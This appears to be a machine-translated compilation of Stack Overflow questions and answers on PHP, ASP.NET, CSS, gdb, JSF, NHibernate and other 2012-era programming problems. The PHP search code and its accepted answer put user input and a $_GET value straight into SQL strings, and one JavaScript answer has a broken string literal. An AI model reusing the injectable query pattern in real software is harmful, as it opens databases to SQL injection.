请注意，这假定`DoInt`定义为`Task<int> DoInt(int value);`，这与您的描述不同，但遵循您的代码示例。

如果 DoInt 不采用 int 参数（与您的声明匹配），则可能变为：

```
Task<string> DoBoth()
{
    return DoInt().ContinueWith(t => DoString(t.Result)).Unwrap();
} 
```

* * *

作为额外的 - 使用 C# 5 和 .NET 4.5（或异步目标包），您可以将其编写为：

```
async Task<string> DoBoth(int value)
{
    int first = await DoInt(value);
    return await DoString(first);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-02T10:39:48.127

您需要函数式语言中的 flatMap 方法之类的东西。[http://en.wikipedia.org/wiki/Monad_%28functional_programming%29#fmap_and_join](http://en.wikipedia.org/wiki/Monad_%28functional_programming%29#fmap_and_join)

# php - PHP按类别过滤搜索结果并计数

> ID：11955911
> 
> 赞同：2
> 
> 时间：2012-08-14T15:38:14.753
> 
> 标签：php, mysql, filter, search-engine, filtering

我正在尝试使用高级侧边栏，当有人使用搜索栏时过滤结果。我有常规搜索工作，还让它在另一个侧边栏（即价格范围、品牌、条件）上显示一个类别中的项目数，但现在我希望用户单击一个类别并缩小结果，就像你看到的那样新蛋网。

这是我的搜索查询：

```
 function build_query($product_search) {
$search_query = "SELECT * FROM tbl_product p INNER JOIN tbl_brand b ON p.br_id = b.br_id";
$clean_search = str_replace(',', ' ', $product_search);
$search_word = explode(' ', $clean_search);
$final_search_words = array();
if (count($search_word) > 0) {
    foreach ($search_word as $word) {
        if (!empty($word)) {
            $final_search_words[] = $word;
        }
    }
}
$where_list = array();
if (count($final_search_words) > 0) {
    foreach($final_search_words as $word) {
        $where_list[] = "p.pd_name LIKE '%$word%'";
    }
}
$where_clause = implode(' OR ', $where_list);
if(!empty($where_clause)) {
    $search_query .= " WHERE $where_clause";
} 
```

我的侧边栏计算类别也是如此：

```
function narrow_query($product_search) {
$search_query = "SELECT p.pd_name, p.pd_con, b.br_name AS name, c.cat_name AS cat,
    COUNT(p.pd_con) AS con, COUNT(b.br_name) AS brand, COUNT(c.cat_name) AS cat_c,
    COUNT(CASE WHEN p.pd_price >= '00.01' AND p.pd_price <= '99.99' THEN 1 END) AS cnt1,
    COUNT(CASE WHEN p.pd_price >= '100.00' AND p.pd_price <= '199.99' THEN 1 END) AS cnt2,
    COUNT(CASE WHEN p.pd_price >= '200.00' AND p.pd_price <= '299.99' THEN 1 END) AS cnt3,
    And so on and so on...
                FROM tbl_product p JOIN tbl_brand b ON b.br_id = p.br_id
                JOIN tbl_category c ON c.cat_id = p.cat_id";
$clean_search = str_repl...
    (Same word filter code as above) 
```

现在我通过抓住 $_GET 得到了一些有用的东西：

```
"<a href=\"" . $_SERVER['PHP_SELF'] . "?productsearch=" . $product_search . "&narrow=" . $row['cat'] . "$link=1\">" 
```

并在我的函数中使用案例：

```
function any_query($product_search, $link, $narrow) {
previous info from above...
  if(!empty($link)) {
    switch($link)
    case 1:
      $search_query .= " AND b.br_name = '$narrow'";
      break;
    default:
    }
    } 
```

但它没有做这项工作，我只是在这一点上迷路了。

有没有更好的方法或不同的方法来实现这一目标？它不必使用 case 或 $_GET。感谢您的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-29T23:49:42.243

问题是您需要在 OR 语句周围添加括号。我会这样做：

```
$search_query .= ' WHERE 1';

if (!empty($where_clause)) {
    $search_query .= " AND ($where_clause)";
}

if (!empty($narrow)) {
    $search_query .= " AND $narrow";
} 
```

# asp.net - Treeview - Treenode - VB.Net - 不显示节点

> ID：11955912
> 
> 赞同：2
> 
> 时间：2012-08-14T15:38:15.800
> 
> 标签：asp.net, vb.net, datatable, treeview

我正在尝试将数据表中的节点添加到树视图中。我的问题不是添加节点，而是显示它们。我的循环通过并添加每个节点。我有一个正确显示总节点的文本框。但是，树视图什么也不显示。我错过了一些显示属性吗？

感谢您的帮助！

```
 oldComments.DataBind()
    Dim count As Integer = 0
    Dim TreeView1 As TreeView = New TreeView
    ' TreeView1.FindNode("My Node").ChildNodes().Add(New TreeNode("Test This"))
    For Each row As DataRow In dsData.Rows
        Dim node As TreeNode = New TreeNode(row("UpdateTimeStamp").ToString)

        Dim node2 As TreeNode = New TreeNode((count.ToString + " - Count"), "test")
        TreeView1.Nodes.Add(node2)
        TreeView1.Nodes.Add(node)
        TreeView1.Nodes(0).ChildNodes().Add(node)
    Next
    TreeView1.ExpandAll()
    status.Text = TreeView1.Nodes.Count 
```

然后是 ASP：

```
 <asp:TreeView ID="TreeView1" runat="server">
        <Nodes>
            <asp:TreeNode Text="My Node" Value="My Node"></asp:TreeNode>
        </Nodes>
    </asp:TreeView> 
```

我添加了一个节点来查看它在哪里显示/尝试使用查找控件添加一个新的子节点，但没有奏效。建议？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:45:56.550

You are assigning the same node twice. Once to the treeview nodes and once to the child nodes of another node. You do not need to assign a node to the treeview itself if you are adding a child to some node. Change the code to

```
TreeView1.Nodes.Add(node2)
node2.ChildNodes().Add(node) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:45:45.740

我认为问题在于您将所有节点都添加到了错误的`TreeView`.

您已经`TreeView`在标记中将 声明为“TreeView1”。所以这一行：

```
Dim TreeView1 As TreeView = New TreeView 
```

should be removed, and the rest of the code should still work just fine.

This assumes your `TreeView` is directly on the Page at the "top level" and not in some kind of container (like an `UpdatePanel`). If *that's* the case, you would need to first use `FindControl` to get the `TreeView`.

So, rather than removing the line above, you would replace it with something like this:

```
Dim TreeView1 As TreeView = someContainer.FindControl("TreeView1") 
```

[Also, that code probably needs to be running in the `Page_Load` section of your code behind (if it is not already). but I don't really think that's the problem.]

# android - 无法在android中将pdf转换为图像

> ID：11955913
> 
> 赞同：1
> 
> 时间：2012-08-14T15:38:17.740
> 
> 标签：android, android-layout, android-intent

我试图在我的布局中显示内容 pdf 文件（自定义）。我使用 Pdf-renderer 转换为图像（搜索谷歌解决方案......）但它有问题，我修复了项目但它仍然是错误..

我的代码：

```
 try{

        PDFPage mpdfpage;
        PDFFile mpdffile;
        Bitmap bitmap = mpdfpage.getImage(100, 100, null, null, true, true);

    }catch(Exception w)
    {

    } 
```

但有问题：“无法解析类型 java.awt.Image。它是从所需的 .class 文件中间接引用的”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:44:10.850

这些`java.awt`软件包在 Android 上不可用。您需要另一个不依赖它们的 PDF 渲染器。

**更新：查看**[此问题](https://stackoverflow.com/questions/5952626/pdf-library-for-android-pdfbox)答案中的渲染器之一是否适合您的需求。

# css - margin-top 不适用于最新版本的 safari 和 chrome (webkit) 中按钮的子元素

> ID：11955916
> 
> 赞同：0
> 
> 时间：2012-08-14T15:38:20.993
> 
> 标签：css, webkit

锚标记和 div 将 margin-top 属性应用到子元素就好了，但是按钮不能。

我已经在最新版本的 safari、chrome 和 firefox 中进行了测试。如果应用了 -moz-focus-inner 属性，Firefox 没有问题，我想知道 webkit 是否可能存在类似问题？

[http://jsfiddle.net/Ym3BL/1/](http://jsfiddle.net/Ym3BL/1/)

有谁知道如何使这三个项目的样式相同/或如何在 webkit 浏览器中允许 margin-top？

非常感谢

-贾伊

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:58:29.580

所以我想通了，感觉像个笨蛋。

key 属性`-webkit-margin-top-collapse:separate;`应用于子元素，这对我来说仍然不太有意义，因为父元素没有边距或填充，所以为什么我需要分隔边距？

但是它有效，所以我不抱怨

[http://jsfiddle.net/Ym3BL/2/](http://jsfiddle.net/Ym3BL/2/)

# gdb - 在 gdb 中打印某些变量会导致执行恢复

> ID：11955919
> 
> 赞同：2
> 
> 时间：2012-08-14T15:38:33.687
> 
> 标签：gdb

十年来我一直在使用 gdb，但从未见过这个特殊问题。我升级到 gdb 7.4，问题仍然存在。

我正在 RHEL5 上调试 Cilk 多线程 C++ 应用程序。执行在段错误处停止。当我要求 gdb 打印某些变量的值（它们是 boost::intrusive_ptr 对模板化对象实例的引用）时，gdb 将打印正确的值，但也会*在很短的时间内恢复所有线程上的执行*。我怀疑它会恢复执行，因为我的更多调试打印语句滚动到终端（它不仅仅是清除缓冲区——我可以继续打印它并且它会继续恢复执行）。这种持续执行的短暂突增导致我正在跟踪的变量的值发生变化。至少可以说，这阻碍了调试。

我怀疑我有内存泄漏并且堆栈已损坏，但我已经在代码上运行了 valgrind（具有不同的初始条件）并且它显示我正在调试的主要子系统中没有内存泄漏，除了名义上的 Cilk - 内部泄漏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T04:10:59.377

> 当我要求 gdb 打印某些变量的值（它们是对模板化对象实例的 boost::intrusive_ptr 引用）时，gdb 将打印正确的值，但也会在很短的时间内在所有线程上恢复执行。

我知道发生这种情况的唯一方法是，如果你有

1.  类型 ( `boost::intrusive_ptr`) 和
2.  那台漂亮的打印机回调到劣质（正在调试）进程。

您可以通过例如禁用所有漂亮的打印机`disable pretty-printer`。如果这有帮助，您可能应该找出确切的漂亮打印机正在执行此操作，并联系其作者。

# eclipse - 在 Eclipse 和命令行中启动 tomcat

> ID：11955921
> 
> 赞同：5
> 
> 时间：2012-08-14T15:38:38.277
> 
> 标签：eclipse, tomcat

我正在使用tomcat 6，当我从命令行启动它时，它运行的应用程序运行良好，但是当我从eclipse启动tomcat（我在eclipse中将它添加为服务器）时，当我尝试运行应用程序时出现404错误在我的浏览器中。任何想法为什么会这样？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-14T15:41:57.263

默认情况下，当您在 Eclipse 中引用现有的 Tomcat 实例时，仅使用其引擎。Tomcat`/webapps`文件夹中所有已部署的 webapps 都将**被忽略**。您似乎希望从 Eclipse 内部启动 Tomcat 时也可以访问它们。

您需要在 Eclipse 中配置 Tomcat 服务器引用以将*Server Locations*设置为*Use Tomcat installation*而不是（默认）*Use workspace metadata*。双击*服务器*视图中的 Tomcat 服务器条目以对其进行编辑。

![在此处输入图像描述](../Images/52e496ae6592318058a4f1e847990562.png)

这样，当您从 Eclipse 内部启动 Tomcat 时，部署到 Tomcat 的所有内容（不受 Eclipse 控制）也将可用。

# css - 如何制作这个线性渐变跨浏览器？

> ID：11955922
> 
> 赞同：0
> 
> 时间：2012-08-14T15:38:49.103
> 
> 标签：css

```
background: -moz-linear-gradient(center bottom , #303030, #3A3A3A) repeat scroll 0 0 transparent; 
```

我尝试`background:-webkit-linear-gradient (center bottom , #303030, #3A3A3A) repeat scroll 0 0 transparent;` 了chrome，但没有用。同样对于 IE，我尝试`ms-linear-gradient`使用相同的值，但效果不佳。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:41:08.807

这里有一个很好的工具可用于为渐变生成 css：

[http://www.colorzilla.com/gradient-editor/](http://www.colorzilla.com/gradient-editor/)

对于其他 css3，您可以使用： [http ://www.css3generator.com/](http://www.css3generator.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T16:01:53.423

要么使用[这个很棒的渐变应用程序](http://www.gradientapp.com/)，要么使用[css3please.com](http://css3please.com)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T21:27:23.267

知道`linear-gradient`语法最近发生了变化：

*   起点关键字（`center`, `bottom`）已更改为终点，以“到”关键字（`to center`, `to botom`）为前缀；
*   角度现在从圆圈顶部的 0 开始，顺时针方向移动。

省略前缀时，MSIE10 将支持新语法。

# ios - 在不使用 ios 通知的情况下唤醒 ios 应用程序

> ID：11955926
> 
> 赞同：0
> 
> 时间：2012-08-14T15:38:59.583
> 
> 标签：ios, notifications

是否可以使用非 ios 通知中心唤醒后台应用程序？例如，如果我正在创建一个呼叫或消息应用程序，是否可以通过 SMS 唤醒该应用程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:42:53.917

没有。如果你想在设备外调用app，你应该使用APNS。在设备上，您可以使用本地通知。发送短信唤醒应用程序有点错误。人们不喜欢这样的解决方案——想象一下每天为不同的应用程序发送大量短信。对不起。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:49:05.807

不。

如果您有后台代码运行，您可以为自己安排本地通知。如果用户单击“确定”，那么您将来到前台。有关说明和示例代码，请参见[此处](http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html#//apple_ref/doc/uid/TP40007072-CH4-SW31 "这里")。

据我所知，在没有用户输入的情况下启动应用程序的唯一方法是通过自定义 URL 处理程序或通过附件。听起来配件不适合您的用例。遗憾的是，您无法从后台打开 URL，因此您无法使用它来唤醒自己。

# jquery - 用 Jquery 查找像素高度？

> ID：11955931
> 
> 赞同：0
> 
> 时间：2012-08-14T15:39:08.167
> 
> 标签：jquery, html

我正在尝试使用[此脚本测试像素高度](http://jsfiddle.net/MichaelT/Jqr6z/)

我基本上是在尝试测试什么时候我想要一些东西褪色。

我以前在某个地方见过它，在滚动时我应该看到数字。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:43:34.507

您的代码中有错误`})`，您应该从 jsfiddle 的左侧面板加载 jQuery：

```
$(document).ready(function(){
    $(window).scroll(function(){
      $('#test').text($(this).scrollTop());
    });
 // }); this line should be removed
}); 
```

然而，当页面滚动时文本是不可见的，您可以创建一个元素，设置它的位置`fixed`并更新它的文本。

[http://jsfiddle.net/Jqr6z/10/](http://jsfiddle.net/Jqr6z/10/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:46:20.630

我为你修复了代码。

[http://jsfiddle.net/Jqr6z/8/](http://jsfiddle.net/Jqr6z/8/)

两件事情。

首先有一个额外的`});`

其次，您没有包含 jquery。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:48:33.550

希望这个小提琴是你需要的[http://jsfiddle.net/Jqr6z/12/](http://jsfiddle.net/Jqr6z/12/)

```
$(window).scroll(function(){    
  $('#test').html($(this).scrollTop());
}); 
```

# c# - Fluent NHibernate - 将外键映射为属性

> ID：11955933
> 
> 赞同：6
> 
> 时间：2012-08-14T15:39:18.573
> 
> 标签：c#, fluent-nhibernate, foreign-key-relationship, fluent-nhibernate-mapping

我正在寻找一种在两个实体之间添加关联并为外键设置可设置 ID 的方法。我已经搜索过以前的帖子，但我能找到的最接近的是 .Load 关联的建议——这不是我所希望的。我知道这可以通过 .HasForeignKey 绑定在实体框架中完成，但我似乎无法在 Fluent NHibernate 中找到方法。

以两个示例实体为例：

```
public class Ticket
{
    public virtual int Id { get; set; }
    public virtual string Title { get; set; }
    public virtual string ServiceId { get; set; }
    public virtual Service Service { get; set; }
}

public class Service
{
    public virtual string Id { get; set; }
} 
```

我希望能够创建一个新的**Ticket**实例并使用以下方式为其分配一个**服务**（假设关联的**服务**已经存在于表中）：

```
Ticket ticket = new Ticket() {
    Title = "Problem with MS Word",
    ServiceId = "Microsoft Word 2012"
}; 
```

我不想做的是以下几点：

```
Ticket ticket = new Ticket() {
    Title = "Problem with MS Word",
    Service = Session.Load<Service>("Microsoft Word 2012")
}; 
```

我确实有这样做的正当理由，就像我说过这可以在 Entity Framework 中完成，但我真的很难在 Fluent NHibernate 中实现同样的事情。我的映射目前如下所示：

```
public class TicketMapping : ClassMap<Ticket>
{
    public TicketMapping()
    {
        Id(m => m.Id);
        Map(m => m.Title).Column("Title");
        Map(m => m.ServiceId).Column("ServiceId");
        HasOne(m => m.Service).ForeignKey("ServiceId");

        Schema("dbo");
        Table("Tickets");
    }
}

public class ServiceMapping : ClassMap<Service>
{
    public ServiceMapping()
    {
        Id(m => m.Id);

        Schema("dbo");
        Table("Services");
    }
} 
```

任何帮助总是很感激！

* * *

只是对**Jay**的快速编辑——我不想 Session.Load 我的元素的原因是因为我不希望我的表示层（MVC 3）知道任何关于 NHibernate 的信息——因此我使用存储库模式并注入一个单个存储库到控制器中。例如，我将有一个符合以下合同的**TicketRepository**

```
public interface IRepository<T>
{
    T GetById(object id);
    void Create(T entity);
    void Update(T entity);
    void Delete(T entity);
} 
```

我不想注入**ServiceRepository**也只是为了获取对**Ticket的****Service**的引用。

 *** * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:47:15.470

在我看来，在使用 NHibernate 时，您无法真正避免使用 Session.Load(id)。正如评论中提到的，这不会命中数据库，只需创建一个带有 id 的代理对象。

一些可能的选择：

1.  将第二个通用存储库 (ServiceRepository) 注入控制器。我真的看不出有什么问题，但出于某种原因你想避免它。您可以将 LoadById 方法添加到通用接口，并在 NH 和 EF（或其他）的每个实现中以不同方式实现。在 EF impl 中，该方法可能像 GetById 一样工作，而在 NH impl 中，它调用 Session.Load
2.  为 AR（聚合根）实现一个非通用存储库，在本例中为 Ticket。这可能具有加载服务和票证的特定方法。
3.  在两个存储库之上实现另一个抽象并将其注入控制器而不是选项 1 中的两个存储库。这可以 f.ex 是此处概述的持久性无知 UnitOfWork：[Persistance ignorant UoW](http://codeinsanity.com/archive/2008/10/03/implementing-a-persistence-ignorant-unit-of-work-framework.aspx)或某种编排的应用程序服务票证或票证工厂的创建。

在这 3 个选项中，选项 1 可能是最简单的，而选项 3 可能会提供更好的抽象性和更多的可维护性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-28T10:38:57.230

你可以使用一个技巧。保持你的代码干净。

就像这是 NH 的问题，您必须在 NH Repositories 中实现它的解决方案，所以我这样解决。

添加或更新之前

```
if (!string.IsNullOrEmpty(ServiceId) && Service == null)
{
   Service = new Service{ Id = ServiceId };
} 
```

正常的存储库工作...

我测试它并工作。您的架构仍然没有 ORM 决策**

# jsf-2 - 双击 JSF 2 中的提交按钮

> ID：11955936
> 
> 赞同：1
> 
> 时间：2012-08-14T15:39:23.363
> 
> 标签：jsf-2, primefaces, submit, double

我有这个问题，在一个页面中，当我单击`commandButton`“编辑器”时它可以工作：它运行该方法`managedBean`并将我返回到目标页面但是在这个目标页面中我必须双击链接按钮将我发送到另一个目标页面，但如果我只点击“annuler”按钮（它只将我重定向到目标页面而不对数据库进行任何更改）我没有这个问题

这是包含“editer”和“annuler”按钮的页面：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:p="http://primefaces.org/ui"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core">

    <body>

        <ui:composition template="./template_admin.xhtml">

            <ui:define name="content">

                    <p:panel header="Edition d'un utilisateur" id="panel" >
                        <h:panelGrid columns="2" columnClasses="column" cellpadding="5">
                            <h:outputText value="Nom : " />  
                            <p:inplace id="basic" emptyLabel="Veuillez saisir un Nom" editor="true" >  
                                <p:inputText value="#{editUserController.u1.nom}" />  
                            </p:inplace> 

                            <h:outputText value="Prénom : " />  
                            <p:inplace id="basic1">  
                                <p:inputText value="#{editUserController.u1.prenom}" />  
                            </p:inplace>  

                            <h:outputText value="Type (Dlbclick): "/>  
                            <p:inplace id="selectableInplace" label="#{editUserController.u1.type}" effectSpeed="fast" event="dblclick">  
                                <p:selectOneMenu label="Type d'impression" id="rfhfbs" value="#{editUserController.u1.type}" required="true" requiredMessage="veuillez choisir un type d'impression" >

                                    <f:selectItems value="#{editUserController.types}" />
                                </p:selectOneMenu>
                            </p:inplace> 

                            <h:outputText value="Division : " />  
                            <p:inplace id="basic2">  
                                <p:inputText value="#{editUserController.u1.division}" />  
                            </p:inplace>  

                            <h:outputText value="Grade : " />  
                            <p:inplace id="basic3">  
                                <p:inputText value="#{editUserController.u1.grade}" />  
                            </p:inplace>  

                            <h:outputText value="Téléphone du poste : " />  
                            <p:inplace id="basic4">  
                                <p:inputText value="#{editUserController.u1.telPoste}" />  
                            </p:inplace>  

                            <h:outputText value="Email : " />  
                            <p:inplace id="basic5">  
                                <p:inputText value="#{editUserController.u1.email}" />  
                            </p:inplace>  

                            <h:outputText value="Autres : " />  
                            <p:inplace id="basic6">  
                                <p:inputText value="#{editUserController.u1.autres}" />  
                            </p:inplace>  

                            <h:outputText value="Identifiant : " />  
                            <p:inplace id="basic7">  
                                <p:inputText value="#{editUserController.u1.identifiant}" />  
                            </p:inplace>  

                            <h:outputText value="Mot de passe : " />  
                            <p:inplace id="basic8">  
                                <p:inputText value="#{editUserController.u1.motdepasse}" />  
                            </p:inplace>  

                            <h:outputText value="Retapez le Mot de passe : " />  
                            <p:inplace id="basic9">  
                                <p:inputText value="#{editUserController.u1.motdepasse}" />  
                            </p:inplace>

                        </h:panelGrid>  
                        <p:commandButton value="Editer"  action="#{editUserController.updateUser()}" update="panel" ></p:commandButton>
                        <p:commandButton value="Annuler" action="utilisateurs" ajax="false" ></p:commandButton>
                    </p:panel>  

            </ui:define>

        </ui:composition>

    </body>
</html> 
```

上面这个效果很好

这是两种情况下的目标页面：

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns:p="http://primefaces.org/ui"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:h="http://java.sun.com/jsf/html">

    <body>

        <ui:composition template="./template_admin.xhtml">

            <ui:define name="content">

                    <p:commandButton value="ajouter" style="margin-bottom: 20px;" />
                    <p:dataTable id="carsTable" var="car" value="#{utilisateursController.lu}">  

                        <f:facet name="header">  
                            Expand rows to see detailed information  
                        </f:facet>  

                        <p:column style="width:4%">  
                            <p:rowToggler />  
                        </p:column>  

                        <p:column style="width:48%">  
                            <f:facet name="header">  
                                Id  
                            </f:facet>  
                            <h:outputText value="#{car.id}" />  
                        </p:column>  

                        <p:column style="width:48%">  
                            <f:facet name="header">  
                                Nom et prénom
                            </f:facet>  
                            <h:outputText value="#{car.nom}   #{car.prenom}" />  
                        </p:column>  

                        <p:column>
                            <p:commandLink ajax="false" value="Editer" action="updateUser_v1" >
                                <f:setPropertyActionListener value="#{car}" target="#{editUserController.u1}" />  
                            </p:commandLink>
                        </p:column>

                        <p:column>
                            <p:commandLink value="supprimer"  />
                        </p:column>            

                        <p:rowExpansion>  
                            <h:panelGrid id="display" columns="2" cellpadding="4" style="width:300px;"  
                                         styleClass=" ui-widget-content grid">  

                                <h:outputText value="Division : " />  
                                <h:outputText id="model" value="#{car.division}" />  

                                <h:outputText value="Grade : " />  
                                <h:outputText id="year" value="#{car.grade}" /> 

                                <h:outputText value="Type : " />  
                                <h:outputText value="#{car.type}"/>  

                                <h:outputText value="Télephone du poste : " />  
                                <h:outputText value="#{car.telPoste}"/>  

                                <h:outputText value="Email : " />  
                                <h:outputText value="#{car.email}"/>  

                                <h:outputText value="Autres : " />  
                                <h:outputText value="#{car.autres}"/>  

                                <h:outputText value="Identifiant : " />  
                                <h:outputText value="#{car.identifiant}"/>  

                                <h:outputText value="Mot de passe : " />  
                                <h:outputText value="#{car.motdepasse}"/>  

                            </h:panelGrid>  
                            <h:commandLink value="liste des commandes" ></h:commandLink><br></br>
                            <h:commandLink value="liste des messages" ></h:commandLink>

                        </p:rowExpansion>  
                    </p:dataTable>  

            </ui:define>

        </ui:composition>

    </body>
</html> 
```

在上面的这个页面中我有问题

这是所有 managedBean ：

```
@ManagedBean
@ViewScoped
public class utilisateursController  implements Serializable{

    utilisateursHelper uh;
    List<Utilisateur> lu;

    public List<Utilisateur> getLu() {
        return lu;
    }
    /**
     * Creates a new instance of utilisateurs
     */
    public utilisateursController() {
        uh = new utilisateursHelper();
        lu = uh.getUtilisateurs();
    }

} 
```

这是另一个 managedBean ：

```
@ManagedBean
@SessionScoped
public class editUserController implements Serializable{

    utilisateursHelper uh;
    Utilisateur u1;
    String[] Types = {"utilisateur", "operateur", "admin"};

    public String[] getTypes() {
        return Types;
    }

    public Utilisateur getU1() {
        return u1;
    }

    public void setU1(Utilisateur u1) {
        this.u1 = u1;
    }

    /**
     * Creates a new instance of editUserController
     */
    public editUserController() {
        u1 = new Utilisateur();
        uh = new utilisateursHelper();
    }

    public String updateUser() {

        uh.updateUtilisateur(u1);
        return "utilisateurs";
    }
} 
```

这是 facelet 模板：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:p="http://primefaces.org/ui"
      xmlns:ui="http://java.sun.com/jsf/facelets">
    <h:head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <h:outputStylesheet name="style.css" library="css" />
        <h:outputStylesheet name="styleTableExpansion.css" library="css" />
    </h:head>
    <h:body>

        <div id="page">
            <div id="bloc-principal">
                 <h:form prependId="false">
                 <div id="templatemo_header_wrapper">

                    <div id="templatemo_header">

                        <div id="site_title">
                            <h1>
                                <span>vous etes connect en tant qu' #{userController.u1.nom} mais le newNum #{commmandeController.nouvelId}</span>
                            </h1>
                        </div>

                        <ul class="social_network">
                            <li><a id="ident">1dd</a></li>
                            <li><a href="login.xhtml" class="identifiant">on voie celle ci</a></li>
                            <li><a class="identifiant">#{userController.identifiant}2ddd</a></li>
                            <li><h:commandLink action="#{userController.deconnecter}"><h:graphicImage library="images" name="facebook.png" /></h:commandLink></li>
                        </ul>

                    </div> <!-- end of templatemo_header -->
                </div> <!-- end of templatemo_header_wrapper -->   

                <div id="templatemo_banner_wrapper">

                    <div id="templatemo_banner">

                    </div> <!-- end of templatemo_banner -->

                </div> <!-- end of templatemo_banner_wrapper -->

                <div id="templatemo_content_wrapper">

                    <div id="templatemo_content">

                         <ui:insert name="content">content</ui:insert>
                    </div> <!-- end of templatemo_content -->
                </div> <!-- end of templatemo_content_wrapper -->    
                </h:form>
            </div>
            <div id="templatemo_footer_wrapper">

                <div id="templatemo_footer">

                    <center>

                    </center>

                </div> <!-- end of footer -->
            </div>
        </div>

    </h:body>
</html> 
```

我希望我已经很好地解释了我的问题。先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T19:02:14.403

尝试设置`ajax="false"`以防万一`<p:commandButton/>`

# .htaccess - .htaccess 同名文件和文件夹

> ID：11955937
> 
> 赞同：0
> 
> 时间：2012-08-14T15:39:26.540
> 
> 标签：.htaccess

我是 .htaccess 的新手，我有一个名为 products.php 的 PHP 文件和一个名为 /products 的同名文件夹。

我想为我网站的产品页面创建一个友好的 URL，我想知道是否可以在 /products 文件夹之外执行 products.php 文件。

我正在使用下面的 .htaccess 代码。

```
RewriteEngine On

RewriteCond %{SCRIPT_FILENAME} !-f
RewriteCond %{SCRIPT_FILENAME} !-d

RewriteRule ^products/([a-z0-9-]+)/([0-9]+)/?$ products.php?id=$2&nome=$1 [NC] 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:41:53.600

你试过了吗，它没有用？如果没有，请尝试删除此行：

```
RewriteCond %{SCRIPT_FILENAME} !-d 
```

# javascript - 无法设置div的html数据

> ID：11955939
> 
> 赞同：0
> 
> 时间：2012-08-14T15:39:43.043
> 
> 标签：javascript, jquery

我正在尝试使用 jquery html() 方法在 div 中显示外部 poll(inject a) 脚本。我也尝试过使用 .append 方法而不是 .html 但结果相同。

这是小提琴：http: [//jsfiddle.net/adrianjsfiddlenetuser/6S3zg/1/](http://jsfiddle.net/adrianjsfiddlenetuser/6S3zg/1/)

该脚本未显示在 div 中。在 Chrome 中我收到错误：“未捕获的 TypeError：无法设置属性 'innerHTML' of null”

```
<div id="toupdate">

</div>​

var htmlString = "<script type=\"text/javascript\" charset=\"utf-8\" src=\"http://static.polldaddy.com/p/6343621.js\"><\/script>\
    <noscript><a href=\"http://polldaddy.com/poll/6343621/\">New Poll</a><\/noscript>";

$("#toupdate").html(htmlString); 

alert(htmlString); 
```

​</p>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:53:41.233

在本地 html 文件中尝试此代码。工作正常，可能是 JS Fiddle。不要忘记包含 jquery。我还重新格式化了您的 htmlstring 值，您不需要转义每个 \ 或 " 在您的情况下，只需使用 ' 并以 ' 结尾来制作字符串文字

```
<div id="toupdate">

</div>​

var htmlString = '<script type="text/javascript" charset="utf-8" src="http://static.polldaddy.com/p/6343621.js"></script>

<noscript><a href="http://polldaddy.com/poll/6343621/">New Poll</a></noscript>";

<script type="text/javascript">
$("#toupdate").html(htmlString); 

alert(htmlString);
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T10:46:41.633

我的问题是剧本。我需要等待页面加载，直到设置其 html 内容。不再抛出错误，但仍未设置内容。

[http://jsfiddle.net/6S3zg/6/](http://jsfiddle.net/6S3zg/6/)

# visual-studio - TFS 2010 自定义报告 SQL 查询以列出集合中每个版本（分支名称）和项目的所有活动分支

> ID：11955941
> 
> 赞同：3
> 
> 时间：2012-08-14T15:39:45.157
> 
> 标签：visual-studio, sql-server-2008, merge, branch

自从我开始使用 TFS 2010（如果重要的话，通过 VS 2008）并负责生成管理报告，我就遇到了很多挑战。我知道有一个 API 和 Sidekick，但都没有提供我的团队所需的详细信息、调度功能、零客户参与或易用性。

在查看了其中一个集合模式之后，我变得更加沮丧......我们没有使用该工具的测试/实验室部分，因此唯一可用的数据库关系对我们几乎没有用处。

